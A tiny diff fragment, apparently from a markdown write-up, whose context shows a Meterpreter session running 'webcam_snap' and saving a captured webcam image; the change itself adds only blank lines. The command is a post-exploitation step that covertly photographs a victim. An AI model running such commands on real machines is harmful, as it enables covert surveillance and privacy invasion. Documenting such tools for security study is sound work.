@@ -35,3 +35,5 @@ meterpreter > webcam_snap -i 1
 Webcam shot saved to: /root/TwAFDLnF.jpeg
 
 ```
+
+
